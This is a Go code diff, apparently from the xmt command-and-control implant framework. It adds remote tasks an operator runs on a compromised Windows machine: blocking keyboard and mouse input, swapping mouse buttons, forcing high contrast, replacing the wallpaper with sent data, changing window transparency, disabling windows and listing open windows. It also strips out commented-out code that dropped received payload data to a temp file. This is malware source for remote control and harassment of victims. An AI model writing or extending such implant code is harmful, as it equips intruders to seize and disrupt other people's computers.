@@ -5,6 +5,7 @@ package task
 import (
 	"bytes"
 	"context"
+	"io"
 	"os"
 	"strings"
 
@@ -13,11 +14,44 @@ import (
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/regedit"
+	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/device/winapi/registry"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
+func taskTroll(_ context.Context, r data.Reader, _ data.Writer) error {
+	t, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	switch t {
+	case taskTrollHcEnable, taskTrollHcDisable:
+		return winapi.SetHighContrast(t == taskTrollHcEnable)
+	case taskTrollSwapEnable, taskTrollSwapDisable:
+		return winapi.SwapMouseButtons(t == taskTrollSwapEnable)
+	case taskTrollBlockInputEnable, taskTrollBlockInputDisable:
+		return winapi.BlockInput(t == taskTrollBlockInputEnable)
+	case taskTrollWallpaper:
+		var s string
+		if err = r.ReadString(&s); err != nil {
+			return err
+		}
+		return winapi.SetWallpaper(s)
+	case taskTrollWallpaperPath:
+		f, err := os.CreateTemp("", execD)
+		if err != nil {
+			return err
+		}
+		_, err = io.Copy(f, r)
+		if f.Close(); err != nil {
+			os.Remove(f.Name())
+			return err
+		}
+		return winapi.SetWallpaper(f.Name())
+	}
+	return xerr.Sub("invalid type", 0xD)
+}
 func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.StringVal()
 	if err != nil {
@@ -216,8 +250,49 @@ func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 			return err1
 		}
 		return regedit.SetExpandString(k, v, s)
-	default:
-		return registry.ErrUnexpectedType
+	}
+	return registry.ErrUnexpectedType
+}
+func taskInteract(_ context.Context, r data.Reader, _ data.Writer) error {
+	t, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	var h uint64
+	if err = r.ReadUint64(&h); err != nil {
+		return err
+	}
+	switch t {
+	case taskWindowTransparency:
+		var v uint8
+		if err = r.ReadUint8(&v); err != nil {
+			return err
+		}
+		return winapi.SetWindowTransparency(uintptr(h), v)
+	case taskWindowEnable, taskWindowDisable:
+		_, err = winapi.EnableWindow(uintptr(h), t == taskWindowEnable)
+		return err
+	}
+	return xerr.Sub("invalid type", 0xD)
+}
+func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
+	e, err := winapi.TopLevelWindows()
+	if err != nil {
+		return err
+	}
+	if err = w.WriteUint32(uint32(len(e))); err != nil {
+		return err
+	}
+	if len(e) == 0 {
+		return nil
+	}
+	for i := range e {
+		if i >= int(data.LimitLarge) {
+			break
+		}
+		if err = e[i].MarshalStream(w); err != nil {
+			return err
+		}
 	}
 	return nil
 }
@@ -282,20 +357,4 @@ func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, error
 	}
 	v.Timeout, v.Dir, v.Env, v.Data = z.Timeout, z.Dir, z.Env, z.Data
 	return v, z.Wait, nil
-	// NOTE(dij): Removing ZombieDLL code for now.
-	/*if len(z.Data) == 0 {
-		// NOTE(dij): Sanity check, shouldn't happen here.
-		return nil, false, false, cmd.ErrEmptyCommand
-	}
-	f, err := os.CreateTemp("", execB)
-	if err != nil {
-		return nil, false, false, err
-	}
-	_, err = f.Write(z.Data)
-	if f.Close(); err != nil {
-		os.Remove(f.Name())
-		return nil, false, false, err
-	}
-	v.Path = f.Name()
-	return v, z.Wait, true, nil*/
 }
